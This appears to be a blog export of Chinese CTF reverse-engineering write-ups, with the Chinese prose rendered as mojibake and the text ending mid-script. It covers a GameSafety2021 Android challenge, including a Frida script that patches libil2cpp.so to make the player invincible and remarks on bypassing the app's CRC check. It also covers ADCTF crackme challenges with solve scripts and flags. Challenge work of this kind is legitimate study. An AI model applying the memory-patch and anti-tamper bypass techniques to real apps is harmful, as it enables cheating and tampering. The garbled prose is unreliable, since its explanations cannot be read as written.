ä¸ªunityç‰ˆæœ¬éƒ½ä¸ç¬¦åˆé¢„æœŸã€‚ã€‚ã€‚)\nç”¨il2cppdumperåˆ†æè‡ªå·±ç¼–è¯‘çš„libil2cpp.soï¼ŒæˆåŠŸæ¢å¤ç¬¦å·å¹¶é€šè¿‡å­—ç¬¦ä¸²çš„æœç´¢æ‰¾åˆ°å¯¹åº”çš„å’Œå®ç°æ— æ•Œçš„å‡½æ•°PlayerController__OnCollisionEnter2D åœ¨è¯¥å‡½æ•°å†…éƒ¨æ‰¾åˆ°åˆ¤å®šè§’è‰²æ­»äº¡çš„å…³é”®é€»è¾‘ï¼Œä½†æ˜¯ç°åœ¨ç›®çš„æ˜¯è¦åœ¨é¢˜ç›®çš„soä¸­æ‰¾åˆ°å¯¹åº”æ¸¸æˆé€»è¾‘æ‰€åœ¨çš„ä½ç½®ï¼Œäºæ˜¯åœ¨UnityEngine_Component__CompareTagå‡½æ•°ä¸­å‘ç°æœ‰å­—ç¬¦ä¸²ä¿¡æ¯ åœ¨dumpä¸‹æ¥çš„soä¸­é€šè¿‡bindiffæ¢å¤äº†éƒ¨åˆ†ç¬¦å·ä¹‹åï¼Œä¹Ÿæ˜¯æˆåŠŸå®šä½åˆ°é¢˜ç›®çš„soçš„å…³é”®é€»è¾‘ åªéœ€è¦æŠŠ0x540E60å¤„æŒ‡ä»¤çš„BNEä¿®æ”¹æˆBå³å¯å®ç°æ— æ•Œ ç»è¿‡Fridaçš„éªŒè¯ç¡®å®å¯ä»¥å®ç°æ— æ•Œ 1 2 3 4 5 6 7 8 9 10 11 function patch(){ var module = Process.findModuleByName(\u0026#34;libil2cpp.so\u0026#34;); var il2cppAddr = module.base; console.log(\u0026#34;il2cppAddr:\u0026#34;, il2cppAddr); var PatchPosition = 0x540E60; var PatchCode = [0xE2, 0x00, 0x00, 0xEA]; console.log(\u0026#34;[+]Patching...\u0026#34;); Memory.protect(il2cppAddr.add(PatchPosition), 4, \u0026#39;rwx\u0026#39;); Memory.writeByteArray(il2cppAddr.add(PatchPosition), PatchCode); console.log(\u0026#34;[+]Patched success!!\u0026#34;); } Question2:dumpä¸‹æ¥çš„il2cpp.soç¼ºå°‘ç¬¦å·(å·²è§£å†³) è¯·çœ‹ä¸‹é¢ä¸¤ä¸ªå¯¹æ¯”å›¾ï¼Œç¬¦å·æ˜¯æœ‰ä¸€äº›æ¢å¤çš„ï¼Œä½†æ˜¯å…³é”®ä»£ç ç¬¦å·æ²¡æœ‰æ¢å¤\nåœ¨åˆ«äººwpä¸­çœ‹åˆ°çš„ æˆ‘dumpä¸‹æ¥çš„libil2cpp.soåœ¨IDAä¸­çœ‹åˆ°çš„ ä¸‹é¢æ˜¯æˆ‘dump il2cppçš„è¿‡ç¨‹(ä¸çŸ¥é“æ˜¯ä¸æ˜¯dumpçš„æ—¶å€™åœ°å€èŒƒå›´é€‰é”™äº†) æˆ‘ç›®å‰çš„çŒœæµ‹wpä¸­çœ‹åˆ°çš„æ˜¯å¤§ä½¬ç¼–è¯‘äº†ä¸€ä»½il2cpp.soç„¶åæ¢å¤çš„ç¬¦å·ï¼Œä½†æ˜¯ä¸ç¡®å®šæ˜¯ä¸æ˜¯ï¼Œæ‰“ç®—è‡ªå·±ç¼–è¯‘ä¸€ä»½çœ‹çœ‹çš„ï¼Œä½†æ˜¯ä¸ä¼šï¼Œå¾…åŠ(ç¡®å®æ˜¯)\nQuestion3:åŠ è½½global-metadata.datå‡½æ•°çš„è°ƒç”¨é“¾ å¦‚å›¾ï¼Œä¸æ˜ç™½è¿™ä¸ªåŠ è½½å‡½æ•°ä¸ºä»€ä¹ˆè°ƒç”¨åˆ°è¿™é‡Œäº† Question4:å®ç°æ— æ•Œä¹‹åæœªæˆåŠŸç»•è¿‡appçš„crcæ ¡éªŒï¼Œå¯¼è‡´é‡æ‰“åŒ…çš„apkæ— æ³•è¿è¡Œ å› ä¸ºæ²¡æœ‰åˆ†ælibil2cpp.soçš„è§£å¯†å‡½æ•°å’Œå…¶ä»–çš„ä¸€äº›ä»£ç æ®µæ ¡éªŒå‡½æ•°ï¼Œæ‰€ä»¥æ— æ³•å®ç°ç ´è§£ç‰ˆapkå¯ä»¥ç›´æ¥è¿è¡ŒğŸ˜­\n","date":"2025-01-08T00:00:00Z","image":"https://jeremiah.oss-cn-shenzhen.aliyuncs.com/picture/202501091217153.png","permalink":"http://www.j3r3m14h.com.cn/Je2em1ah_blog/p/gamesafety2021-android-final/","title":"GameSafety2021 Android Final"},{"content":"ADCTFæ–°ç”Ÿèµ›ä¸ªäººwp Reverse checkin IDAæ‰“å¼€å¯ä»¥çœ‹åˆ°é€»è¾‘å¾ˆç®€å• ç›´æ¥ç»™å‡ºexp\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; int main() { char encoded[30] = { 0x55, 0x17, 0xC9, 0xBB, 0x4A, 0xA5, 0x86, 0xDF, 0x24, 0x0A, 0x1C, 0xA3, 0x27, 0xA1, 0x57, 0x35, 0xC3, 0xDB, 0x91, 0x88, 0x6D, 0x91, 0xA0, 0xCC, 0x71, 0x57, 0x71, 0xE4, 0x40 }; char original_input[30]; int i; srand(0x7E8u); for (i = 0; i \u0026lt; 29; ++i) { original_input[i] = encoded[i] ^ rand(); } original_input[29] = \u0026#39;\\0\u0026#39;; printf(\u0026#34;%s\\n\u0026#34;,original_input); return 0; } //flag{y0u_Know_rAnd0m_4nd_xOr} æ³¨æ„éœ€è¦åœ¨linuxç¯å¢ƒä¸‹è¿è¡Œ(Windowså’ŒLinuxä¸‹ç”Ÿæˆçš„éšæœºæ•°ä¸åŒï¼Œé™„ä»¶ä¸º64ä½elfæ–‡ä»¶)\nezPy ä¸‹è½½é™„ä»¶åå‘ç°æ˜¯ä¸ªpyinstalleræ‰“åŒ…çš„pythonæ–‡ä»¶(å¯ä»¥é€šè¿‡å›¾æ ‡è¾¨åˆ«)ï¼Œç”¨pyinstxtractorè§£åŒ…å¾—åˆ°main.pycæ–‡ä»¶ï¼Œç”¨åœ¨çº¿ç½‘ç«™å¯¹pycæ–‡ä»¶åç¼–è¯‘(ç”¨æœ¬åœ°çš„pycdcä¹Ÿå¯ä»¥è§£å†³)\nå‰é¢è¿˜æœ‰ä¸€æ®µæ˜¯å¯†æ–‡æ•°æ®ï¼Œç¨‹åºçš„é€»è¾‘å°±æ˜¯æ¯9ä¸ªå­—èŠ‚é€šè¿‡ä¸åŒçš„è¡¨è¾¾å¼è®¡ç®—å¾—åˆ°encodedæ•°ç»„ï¼Œé€†å‘æ€è·¯åªéœ€è¦å¯¹è¿™ä¸ªæ–¹ç¨‹ç»„è¿›è¡Œæ±‚è§£å³å¯ï¼Œé‡‡ç”¨z3çº¦æŸæ±‚è§£å™¨è¿›è¡Œæ±‚è§£ï¼Œexpå¦‚ä¸‹\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 from z3 import * # Create a list of Z3 integer variables for the flag flag = [Int(f\u0026#34;flag_{i}\u0026#34;) for i in range(36)] # Create a solver solver = Solver() # The secret values from the original problem secret = [ 631, 1205, -500, 1021, 1879, 668, -281, 1651, 1326, 593, 428, -170, 515, 1302, 452, 41, 814, 379, 382, 629, 650, 273, 1529, 630, 418, 1207, 1076, 315, 1118, 469, 398, 1803, 647, 729, 1439, 1104 ] # Add constraints for each encoded value for i in range(0, 36, 9): solver.add(3 * flag[i] + 7 * flag[i + 1] - 2 * flag[i + 2] + 5 * flag[i + 3] - 6 * flag[i + 4] - 14 == secret[i]) solver.add(-5 * flag[i + 1] + 9 * flag[i + 2] + 4 * flag[i + 3] - 3 * flag[i + 4] + 7 * flag[i + 5] - 18 == secret[i + 1]) solver.add(6 * flag[i] - 4 * flag[i + 1] + 2 * flag[i + 2] - 9 * flag[i + 5] + 5 * flag[i + 6] - 25 == secret[i + 2]) solver.add(7 * flag[i + 1] + 3 * flag[i + 3] - 8 * flag[i + 4] + 6 * flag[i + 5] - 2 * flag[i + 6] + 4 * flag[i + 7] - 30 == secret[i + 3]) solver.add(2 * flag[i] + 5 * flag[i + 2] - 4 * flag[i + 4] + 7 * flag[i + 5] + 9 * flag[i + 8] - 20 == secret[i + 4]) solver.add(8 * flag[i] - 3 * flag[i + 1] + 5 * flag[i + 3] - 6 * flag[i + 7] + 2 * flag[i + 8] - 19 == secret[i + 5]) solver.add(-7 * flag[i + 1] + 4 * flag[i + 2] - 5 * flag[i + 5] + 3 * flag[i + 6] + 6 * flag[i + 8] - 22 == secret[i + 6]) solver.add(9 * flag[i] + 2 * flag[i + 2] + 6 * flag[i + 3] - 4 * flag[i + 6] + 5 * flag[i + 7] - 3 * flag[i + 8] - 27 == secret[i + 7]) solver.add(4 * flag[i] - 5 * flag[i + 4] + 7 * flag[i + 5] + 3 * flag[i + 6] + 9 * flag[i + 7] - 2 * flag[i + 8] - 33 == secret[i + 8]) # Add constraints for flag ASCII values (valid ASCII range) for f in flag: solver.add(0 \u0026lt;= f, f \u0026lt;= 255) # Check if the solver finds a solution if solver.check() == sat: model = solver.model() result = \u0026#39;\u0026#39;.join(chr(model[flag[i]].as_long()) for i in range(36)) print(\u0026#34;The flag is:\u0026#34;, result) else: print(\u0026#34;No solution found\u0026#34;) #flag{y0U_4rE_r3@1ly_g0o0oOd_At_m4Th} å–ç‚¹èŒ¶å§ IDAæ‰“å¼€ä¹‹åï¼Œç¨‹åºæ˜¯åŠ èŠ±è¿‡çš„ï¼Œä¸‹é¢ç»™å‡ºå»èŠ±è¿‡ç¨‹\nè¿™æ®µæ±‡ç¼–æŒ‡ä»¤ebxå…ˆxoräº†è‡ªå·±ï¼Œæ‰€ä»¥ZFæ ‡å¿—ä½ä¸€å®šæ˜¯0ï¼Œç¨‹åºæ­£å¸¸çš„æ‰§è¡Œæµç¨‹åªä¼šæ‰§è¡ŒjzæŒ‡ä»¤è·³è½¬åˆ°0x4012FA+1çš„ä½ç½®ï¼Œè§£å†³æ–¹æ³•patchæ‰0x4012FAçš„å­—èŠ‚å†æŠŠå‰©ä¸‹çš„å­—èŠ‚è½¬æ¢æˆcodeå³å¯(C)\nç¬¬äºŒå¤„èŠ±æŒ‡ä»¤å’Œç¬¬ä¸€å¤„ç±»ä¼¼ï¼Œpatch0x401328å¤„çš„å­—èŠ‚å³å¯ï¼ŒåŒ…æ‹¬loc_401320è¿™ä¸€æ®µæ•°æ®ä¹Ÿå¯ä»¥ç›´æ¥nopæ‰ï¼Œå› ä¸ºç¨‹åºåªä¼šæ‰§è¡Œjzè¿™æ¡æŒ‡ä»¤çš„æ§åˆ¶æµï¼Œä¸­é—´çš„éƒ½æ˜¯ä¸ä¼šæ‰§è¡Œçš„åƒåœ¾æ•°æ®ï¼Œå»é™¤å®Œä¹‹åå°±å¯ä»¥åœ¨å‡½æ•°å¤´æŒ‰På®šä¹‰è¿™ä¸ªå‡½æ•°ï¼Œå†F5åç¼–è¯‘å°±å¯ä»¥çœ‹åˆ°mainå‡½æ•°(å·²ç»è¿‡æ•´ç†)\næ¥ç€åˆ†æencryptå‡½æ•°\nå‘ç°å¹¶æ²¡æœ‰æ‰¾åˆ°åŠ å¯†è¿‡ç¨‹ï¼ŒæŸ¥çœ‹è¿™ä¸ªå‡½æ•°çš„æ±‡ç¼–å¯ä»¥å‘ç°è¿™ä¸ªå‡½æ•°ä¹Ÿè¢«åŠ å…¥äº†èŠ±æŒ‡ä»¤\nçœ‹åˆ°è¿™ä¸ªä½ç½®ï¼Œå…ˆæ˜¯calläº†ä¸€ä¸ªé™„è¿‘çš„ä½ç½®ï¼Œç„¶åretnï¼ŒcallæŒ‡ä»¤ä¼šæŠŠcallæŒ‡ä»¤çš„ä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€å…¥æ ˆï¼Œretnåˆ™ä¼šæŠŠå­˜å…¥æ ˆä¸­çš„åœ°å€å¼¹å‡ºåˆ°eipä¸­ï¼Œè¿™ä¸€æ®µæ“ä½œæ²¡æœ‰æ”¹å˜ç¨‹åºåŸæ¥çš„æ‰§è¡Œæµç¨‹ï¼Œä½†æ˜¯ä¼šå¯¼è‡´IDAè¯†åˆ«å‡ºé”™å¯¼è‡´æ ˆå¤±è¡¡ï¼Œè§£å†³æ–¹æ³•å°±æ˜¯ä»callæŒ‡ä»¤åˆ°retnçš„ä¸‹ä¸€ä¸ªå­—èŠ‚å…¨éƒ¨patchæ‰(0x401215 - 0x401251)ï¼Œæ¥ç€å°±èƒ½çœ‹åˆ°å®Œæ•´çš„é€»è¾‘äº†\n__scrt_common_main_seh()å°±æ˜¯å…·ä½“çš„åŠ å¯†è¿‡ç¨‹ï¼Œç„¶è€Œè¿™ä¸ªå‡½æ•°ä¹Ÿæœ‰èŠ±æŒ‡ä»¤:(\nè¿™ä¸¤ä¸ªä½ç½®å’Œå‰é¢æåˆ°çš„åŸºæœ¬ä¸€æ ·ï¼Œä¸èµ˜è¿°\nå¯ä»¥çœ‹åˆ°teaåŠ å¯†çš„ç‰¹å¾ï¼Œä½†æ˜¯å°è¯•è§£å¯†å¾—åˆ°çš„ç»“æœæ˜¯é”™è¯¯çš„ï¼Œè¿™é‡Œæœ‰ä¸ªMEMORY[0] = 0æŒ‡ä»¤ï¼Œè¿™é‡Œè¦æåˆ°Windowsç³»ç»Ÿä¸‹çš„å¼‚å¸¸å¤„ç†æœºåˆ¶SEHï¼Œç®€è¦æ¥è¯´å°±æ˜¯é€šè¿‡æŸäº›é€»è¾‘é”™è¯¯å¯¼è‡´ç³»ç»Ÿå‘é€é”™è¯¯ä¿¡å·ï¼Œç„¶åç”±SEHçš„è¿‡æ»¤å™¨æ¥å†³å®šè¦ä¸è¦æ¥ç®¡è¿™ä¸ªé”™è¯¯ï¼Œä¸€æ—¦ç³»ç»Ÿå¼€å§‹æ¥ç®¡è¿™ä¸ªé”™è¯¯ï¼Œå°±ä¼šè·³è½¬åˆ°ç›¸åº”çš„å¤„ç†å‡½æ•°ï¼Œå¤„ç†å®Œæˆä¹‹åç»§ç»­æ‰§è¡Œç¨‹åº\næ›´è¯¦ç»†çš„å¯ä»¥çœ‹(https://bbs.kanxue.com/thread-249592.htm)\næœ‰äº†å‰é¢çš„çŸ¥è¯†ä¹‹åï¼Œå¯¹ç¨‹åºåŠ¨è°ƒï¼Œå¯ä»¥å‘ç°å½“ebp+var_1Cåœ°å€å¤„çš„å€¼ä¸º0(sum = 0)æ—¶ï¼Œç¨‹åºåœ¨è¿™ä¸ªåœ°æ–¹è§¦å‘äº†ä¸€ä¸ªå¼‚å¸¸(éæ³•è®¿é—®å†…å­˜åœ°å€ï¼Œå¯¹åº”çš„å¼‚å¸¸å·ä¸º0xC0000005),è¿™æ®µæŒ‡ä»¤çš„æ„æ€å¤§æ¦‚æ˜¯è®¿é—®äº†åœ°å€ä¸º0x0çš„å†…å®¹\næ¥ç€æ‰¾åˆ°å¼‚å¸¸å·å¯¹åº”çš„å¤„ç†å‡½æ•°\né˜…è¯»æ±‡ç¼–ä¹‹åå…¶å®å°±æ˜¯è°ƒç”¨äº†srandå‡½æ•°ï¼Œseedä¸º0x7E8\nå½“sumï¼=0çš„æ—¶å€™ï¼Œç¨‹åºç»§ç»­å¾€ä¸‹æ‰§è¡Œä¼šçœ‹åˆ°è¿™ä¸ªåœ°æ–¹å‡ºå‘äº†ä¸€ä¸ªé™¤æ•°å¼‚å¸¸(SIGILLï¼Œå¼‚å¸¸å·0xC000094)\nè¿™æ®µæ±‡ç¼–çš„æ„æ€å°±æ˜¯ä¸€ä¸ªæ•°é™¤ä»¥0ï¼Œè§¦å‘äº†è¿™ä¸ªå¼‚å¸¸ï¼Œè·³è½¬åˆ°å¼‚å¸¸å·å¯¹åº”çš„å¤„ç†å‡½æ•°\nè¿™é‡Œå°±æ˜¯è°ƒç”¨äº†randå‡½æ•°ï¼Œå†æŠŠsum+=rand()ï¼Œå¤„ç†å®Œä¹‹åç»§ç»­æ‰§è¡Œç¨‹åºçš„sum -= deltaæŒ‡ä»¤ï¼Œä»è¿™é‡Œå¼€å§‹ï¼ŒteaåŠ å¯†çš„æ¯ä¸€è½®åŠ å¯†éƒ½ä¼šè°ƒç”¨ä¸€æ¬¡è¿™ä¸ªrandå‡½æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ç†ä¸€ä¸‹åŠ å¯†çš„æ‰§è¡Œæµç¨‹ï¼šç¬¬ä¸€è½®åŠ å¯†(i=0)æ­£å¸¸æ‰§è¡Œï¼Œä¸­é—´ä¼šè§¦å‘å¼‚å¸¸è°ƒç”¨srand(0x7E8)ï¼Œåé¢çš„31è½®åŠ å¯†æ¯æ¬¡éƒ½ä¼šæ‰§è¡Œsum+=rand(),ä½ç½®åœ¨sum-=deltaä¹‹å‰ï¼Œç†æ¸…æ‰§è¡Œæµç¨‹ä¹‹åå°±å¯ä»¥å†™expäº†,expå¦‚ä¸‹(è®°å¾—åœ¨Windowsä¸‹æ‰§è¡Œï¼Œå› ä¸ºé™„ä»¶æ˜¯exeæ–‡ä»¶)\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; void tea_decrypt(unsigned int* a1, unsigned int* a2) { int i; // [esp+2Ch] [ebp-28h] unsigned int v3; // [esp+30h] [ebp-24h] unsigned int v4; // [esp+34h] [ebp-20h] unsigned int v5; // [esp+38h] [ebp-1Ch] v4 = *a1; v3 = a1[1]; v5 = 0; v5 -= 0x61C88647; unsigned int seed = 0x7E8; srand(seed); int randoms[31]; for (int i = 0; i \u0026lt; 31; i++) { randoms[i] = rand(); // ç”Ÿæˆä¸€ä¸ªéšæœºæ•° v5 += randoms[i]; v5 -= 0x61C88647; } for (i = 0; i \u0026lt; 32; ++i) { //v4 += (a2[v5 \u0026amp; 3] + v5) ^ (v3 + ((v3 \u0026gt;\u0026gt; 5) ^ (16 * v3))); //v5 -= 0x61C88647; v3 -= (a2[(v5 \u0026gt;\u0026gt; 11) \u0026amp; 3] + v5) ^ (v4 + ((v4 \u0026gt;\u0026gt; 5) ^ (16 * v4))); v5 += 0x61C88647; if (i != 31) v5 -= randoms[30 - i]; v4 -= (a2[v5 \u0026amp; 3] + v5) ^ (v3 + ((v3 \u0026gt;\u0026gt; 5) ^ (16 * v3))); } *a1 = v4; a1[1] = v3; } int main() { // åŠ å¯†çš„æ•°æ®ï¼ˆå‡è®¾ä¸ºä¸¤ä¸ª 32 ä½æ•´æ•°ï¼‰ unsigned int key[4] = { 0x114514, 0x1919810, 0x39C5BB, 0xFFE211 }; // å¯†é’¥ unsigned int data[12] = { 0xC20B1189,0x275D3ADE, 0xB1ADFCDE, 0x8201166D, 0xCD1E08DC, 0xA0830899, 0xC7C8C706, 0x9FC9A9F5, 0x8250A71D, 0xED329E66, 0xB88D21D7, 0x2EDA3C43 }; for (int i = 0; i \u0026lt; 12; i += 2) { unsigned int temp[2]; temp[0] = data[i]; temp[1] = data[i + 1]; tea_decrypt(temp, key); printf(\u0026#34;%x%x\u0026#34;, temp[0], temp[1]); } return 0; } //flag{Y0u_s0lv3d_thE_Qu3s7I0n_5O_dr1nk_5oMe_t3A} Py_revenge æ‹¿åˆ°é™„ä»¶ä¹‹åIDAæ‰“å¼€ä¼šçœ‹åˆ°å¾ˆå¤šçš„Pyå­—æ ·ï¼Œå†æ ¹æ®é¢˜ç›®åå­—å¯ä»¥çŒœå‡ºæ˜¯pyinstalleræ‰“åŒ…çš„ç¨‹åºï¼Œç”¨pyinstxtractorè§£åŒ…å¾—åˆ°pycæ–‡ä»¶ï¼Œç”¨pycdcåç¼–è¯‘çš„æ—¶å€™ä¼šå‘ç°åªæœ‰éƒ¨åˆ†é€»è¾‘\nè¿™ç§æƒ…å†µåªèƒ½ç”¨pycdasçœ‹å­—èŠ‚ç \n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 [Disassembly] 0 RESUME 0 2 LOAD_CONST 0: 0 4 LOAD_CONST 1: None 6 IMPORT_NAME 0: base64 8 STORE_NAME 0: base64 10 BUILD_LIST 0 12 LOAD_CONST 2: (27, 40, 57, 63, 24, 4, 66, 4, 100, 122, 8, 27, 21, 122, 4, 15, 122, 20, 17, 98, 25, 115, 55, 82, 74, 71, 23, 20, 9, 26, 28, 105, 95, 34, 90, 46) 14 LIST_EXTEND 1 16 STORE_NAME 1: secret 18 PUSH_NULL 20 LOAD_NAME 2: input 22 LOAD_CONST 3: \u0026#39;Please enter the flag:\u0026#39; 24 CALL 1 32 STORE_NAME 3: flag 34 PUSH_NULL 36 LOAD_NAME 0: base64 38 LOAD_ATTR 8: b64encode 58 LOAD_NAME 3: flag 60 LOAD_ATTR 11: encode 80 CALL 0 88 CALL 1 96 LOAD_ATTR 13: decode 116 CALL 0 124 STORE_NAME 3: flag 126 LOAD_NAME 3: flag 128 GET_ITER 130 LOAD_FAST_AND_CLEAR 0: c 132 SWAP 2 134 BUILD_LIST 0 136 SWAP 2 138 FOR_ITER 10 (to 160) 142 STORE_FAST 0: c 144 PUSH_NULL 146 LOAD_NAME 7: ord 148 LOAD_FAST 0: c 150 CALL 1 158 LIST_APPEND 2 160 JUMP_BACKWARD 12 (to 138) 162 END_FOR 164 SWAP 2 166 STORE_FAST 0: c 168 STORE_NAME 3: flag 170 LOAD_CONST 4: \u0026#39;ADCTF2024\u0026#39; 172 STORE_NAME 8: key 174 PUSH_NULL 176 LOAD_NAME 9: range 178 PUSH_NULL 180 LOAD_NAME 10: len 182 LOAD_NAME 3: flag 184 CALL 1 192 CALL 1 200 GET_ITER 202 FOR_ITER 46 (to 296) 206 STORE_NAME 11: i 208 LOAD_NAME 3: flag 210 LOAD_NAME 11: i 212 COPY 2 214 COPY 2 216 BINARY_SUBSCR 220 PUSH_NULL 222 LOAD_NAME 7: ord 224 LOAD_NAME 8: key 226 LOAD_NAME 11: i 228 PUSH_NULL 230 LOAD_NAME 10: len 232 LOAD_NAME 8: key 234 CALL 1 242 BINARY_OP 6 (%) 246 BINARY_SUBSCR 250 CALL 1 258 BINARY_OP 25 (^=) 262 SWAP 3 264 SWAP 2 266 STORE_SUBSCR 270 LOAD_NAME 3: flag 272 LOAD_NAME 11: i 274 COPY 2 276 COPY 2 278 BINARY_SUBSCR 282 LOAD_NAME 11: i 284 BINARY_OP 25 (^=) 288 SWAP 3 290 SWAP 2 292 STORE_SUBSCR 296 JUMP_BACKWARD 48 (to 202) 298 END_FOR 300 LOAD_NAME 3: flag 302 LOAD_NAME 1: secret 304 COMPARE_OP 40 (==) 308 POP_JUMP_IF_FALSE 9 (to 328) 310 PUSH_NULL 312 LOAD_NAME 12: print 314 LOAD_CONST 5: \u0026#39;Correct!\u0026#39; 316 CALL 1 324 POP_TOP 326 RETURN_CONST 1: None 328 PUSH_NULL 330 LOAD_NAME 12: print 332 LOAD_CONST 6: \u0026#39;Wrong!\u0026#39; 334 CALL 1 342 POP_TOP 344 RETURN_CONST 1: None 346 SWAP 2 348 POP_TOP 350 SWAP 2 352 STORE_FAST 0: c 354 RERAISE 0 ç»è¿‡åˆ†æå¯ä»¥çŸ¥é“ç¨‹åºçš„åŠ å¯†é€»è¾‘å¹¶ä¸éš¾ï¼Œå¤§æ¦‚è¿‡ç¨‹å¦‚ä¸‹\n1 2 3 for i in len(flag) flag[i] = flag[i] ^ key[i % len(key)] ^ i #key = \u0026#34;ADCTF2024\u0026#34; ç›´æ¥ç»™å‡ºexp\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 import base64 secret = [ 27, 40, 57, 63, 24, 4, 66, 4, 100, 122, 8, 27, 21, 122, 4, 15, 122, 20, 17, 98, 25, 115, 55, 82, 74, 71, 23, 20, 9, 26, 28, 105, 95, 34, 90, 46 ] key = \u0026#39;ADCTF2024\u0026#39; decoded_flag = [] for i in range(len(secret)): decoded_flag.append(secret[i] ^ ord(key[i % len(key)]) ^ i) decoded_flag_str = \u0026#39;\u0026#39;.join(chr(c) for c in decoded_flag) original_flag = base64.b64decode(decoded_flag_str).decode() print(original_flag) #flag{u_aR3_4_Py7h0n_M@5t3r} NotOnlyDotNet æ‹¿åˆ°é™„ä»¶ç”¨IDAæ‰“å¼€ï¼Œè¿›å…¥mainå‡½æ•°æ²¡æœ‰å‘ç°ä»€ä¹ˆæ˜æ˜¾çš„åŠ å¯†é€»è¾‘ï¼Œä½†æ˜¯è°ƒç”¨äº†ZSTDçš„apiå’Œä¸€äº›è¿›ç¨‹ä¹‹é—´çš„è°ƒç”¨å‡½æ•°ï¼Œå¹¶ä¸”é€šè¿‡ZSTDæŠŠä¸¤å—å†…å­˜ä¸­çš„æ•°æ®è§£å‹å‡ºæ¥äº†ï¼ŒçŒœæµ‹è¿™ä¸¤å—å†…å­˜æ˜¯é€šè¿‡ZSTDå‹ç¼©è¿‡åçš„æ•°æ®ï¼Œæ‰€ä»¥æ€è·¯ä¸ºdumpå‡ºè¿™ä¸¤æ®µæ•°æ®å†ç”¨ZSTDè§£å‹ï¼Œçœ‹çœ‹ç¨‹åºçš„å…·ä½“é€»è¾‘æ˜¯ä»€ä¹ˆ\ndump shell_data å’Œ core_dataæœ‰ä¸¤ç§æ–¹å¼ï¼Œç¬¬ä¸€ç§æ˜¯ç›´æ¥åŠ¨è°ƒdumpå‡ºè§£å‹åçš„æ•°æ®ï¼Œç¬¬äºŒç§æ–¹æ³•æ˜¯ç”¨IDApyhtonè„šæœ¬æŠŠè¿™ä¸¤æ®µæ•°æ®dumpæˆbinæ–‡ä»¶ï¼Œå†ç”¨ZSTDåº“è¿›è¡Œè§£å‹å¾—åˆ°æ–‡ä»¶ï¼Œè¿™é‡Œé‡‡ç”¨ç¬¬äºŒç§æ–¹å¼\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 import idaapi import idc import ida_bytes start_address = 0x402010 # èµ·å§‹åœ°å€ size = 0x24AA # æ•°æ®å¤§å° output_file = \u0026#34;core_data.bin\u0026#34; # æ‰“å¼€æ–‡ä»¶å‡†å¤‡å†™å…¥ with open(output_file, \u0026#34;wb\u0026#34;) as f: for i in range(size): byte = ida_bytes.get_byte(start_address + i) f.write(bytes([byte])) æ ¹æ®idaä¸­ç»™å‡ºçš„åœ°å€å’Œå¤§å°å°±å¯ä»¥æŠŠè¿™ä¸¤ä¸ªæ–‡ä»¶dumpå‡ºæ¥ï¼Œç„¶åç”¨ZSTDè§£å‹\n1 2 3 4 5 C:\\Users\\HelloCTF_OS\\Downloads\\NotOnlyDotNet (1)\u0026gt;zstd -d gshell_data.bin -o gshell_data_decompressed gshell_data.bin : 66818650 bytes C:\\Users\\HelloCTF_OS\\Downloads\\NotOnlyDotNet (1)\u0026gt;zstd -d core_data.bin -o core_data_decompressed core_data.bin : 12288 bytes å¾—åˆ°è¿™ä¸¤ä¸ªæ–‡ä»¶ï¼Œå¯¹è¿™ä¸¤ä¸ªç¨‹åºæŸ¥å£³ï¼Œå‘ç°æ˜¯C#å†™çš„elfæ–‡ä»¶ï¼Œç”¨ILspyå’Œdnspyè¿›è¡Œåç¼–è¯‘ï¼ŒILspyå’Œdnspyå¥½åƒåªèƒ½è¯†åˆ«exeæ–‡ä»¶æ‰€ä»¥æ”¹äº†åç¼€\næ‰§è¡Œæµç¨‹å¤§æ¦‚æ˜¯ï¼šAES-\u0026gt;XOR-\u0026gt;Base64ï¼Œå…¶ä¸­AESå’ŒXORç”¨åˆ°çš„keyæ˜¯é€šè¿‡mainå‡½æ•°ä¼ å‚è¿‡æ¥çš„ï¼Œæ‰€ä»¥keyåº”è¯¥æ˜¯åœ¨shellé‡Œé¢ï¼Œéšä¾¿ç¿»ç¿»å°±èƒ½æ‰¾åˆ°ï¼Œè¿™é‡Œç›´æ¥æ•´åˆåˆ°ä¸€èµ·äº†\nexpå¦‚ä¸‹(å¤ªæ‡’äº†ä¸¢ç»™aiäº†)\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 from Crypto.Cipher import AES from Crypto.Util.Padding import unpad import base64 def xor_decrypt(data, xor_key): \u0026#34;\u0026#34;\u0026#34;XOR è§£å¯†\u0026#34;\u0026#34;\u0026#34; return bytes([b ^ xor_key[i % len(xor_key)] for i, b in enumerate(data)]) def aes_decrypt(ciphertext, aes_key): \u0026#34;\u0026#34;\u0026#34;AES è§£å¯†\u0026#34;\u0026#34;\u0026#34; cipher = AES.new(aes_key, AES.MODE_CBC, aes_key) # ä½¿ç”¨ aes_key ä½œä¸º IV decrypted = unpad(cipher.decrypt(ciphertext), AES.block_size) return decrypted def main(aes_key, xor_key, encrypted_data_base64): # Base64 è§£å¯† encrypted_data = base64.b64decode(encrypted_data_base64) # å…ˆè¿›è¡Œ XOR è§£å¯† xor_decrypted = xor_decrypt(encrypted_data, xor_key) # å†è¿›è¡Œ AES è§£å¯† aes_decrypted = aes_decrypt(xor_decrypted, aes_key) # è½¬æ¢å› UTF-8 å­—ç¬¦ä¸² decrypted_flag = 